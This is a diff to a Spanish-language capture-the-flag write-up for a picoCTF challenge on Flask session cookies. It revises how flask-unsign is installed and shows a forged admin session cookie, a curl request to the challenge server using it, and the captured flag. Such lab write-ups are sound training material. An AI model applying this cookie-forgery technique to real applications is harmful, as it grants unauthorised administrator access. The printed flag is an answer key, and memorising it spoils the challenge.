@@ -83,12 +83,23 @@ echo "eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9" | base64 -d
 {"very_auth":"blank"}   
 ```
 
-- crakeamos la cookie
+### Intentamos instalar flask-unsign
+
 ```
-sudo apt install pipx
-pipx ensurepath
-pipx install flask-unsign
-source ~/.zshrc 
+sudo apt install flask-unsign
+python3 -m pip install flask-unsign
+sudo apt install python3-flask-unsign
+```
+
+
+
+- Creamos un ambiente virtual para instalar flask-unsign
+```
+sudo apt install python3-venv
+mkdir ~/.venv
+python3 -m venv ~/.venv
+source ~/.venv/bin/activate
+python3 -m pip install flask-unsign
 
 ```
 - creamos una lista de palabras con las cookies en el server.py
@@ -115,11 +126,20 @@ eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.ZvjmyA.rOSGr63LbcfgXKNLDFyr0jyaxNI
 
 
 
- curl -s http://mercury.picoctf.net:52134/display -H "Cookie: session= eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.ZvjkTA.pELtbtVsYtnu8Vwz4vbwJjpQIBw" | grep picoCTF
+ curl -s http://mercury.picoctf.net:52134/display -H "Cookie: session= eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.ZvjkTA.pELtbtVsYtnu8Vwz4vbwJjpQIBw" |  grep -oE "picoCTF{.*?}"
             <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{pwn_4ll_th3_cook1E5_478da04c}</code></p>
 
 
 
 
+
+```
+
+# la opcion mas facil
+
+```
+sudo apt install pipx
+pipx ensurepath
+pipx install flask-unsign
 
 ```
